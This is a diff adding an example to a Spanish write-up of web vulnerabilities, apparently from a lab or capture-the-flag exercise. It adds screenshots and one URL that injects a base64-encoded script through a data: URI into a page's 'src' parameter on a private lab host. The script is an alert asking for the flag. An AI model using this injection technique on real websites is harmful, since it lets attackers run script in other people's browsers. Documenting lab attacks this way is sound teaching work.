@@ -348,6 +348,15 @@ Validación y sanitización de encabezados. Utilizar conexiones seguras HTTPS qu
 
 ### Ejemplo 🔧👨‍💻
 
+![image](https://github.com/user-attachments/assets/273c8319-6028-4ef0-88c1-1dd42d97823e)
+
+![image](https://github.com/user-attachments/assets/9e69b278-9864-41cf-9ef4-773c0a154f62)
+
+```http://10.11.250.221/index.php?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgnZGFtZSBsYSBmbGFnJyk8L3NjcmlwdD4=```
+
+![image](https://github.com/user-attachments/assets/35a840e2-f201-41e5-97ef-d85e02a47e38)
+
+
 ### Prevención 🔒🛡️
 
 ### 14 - File Upload Injection 📤📄 
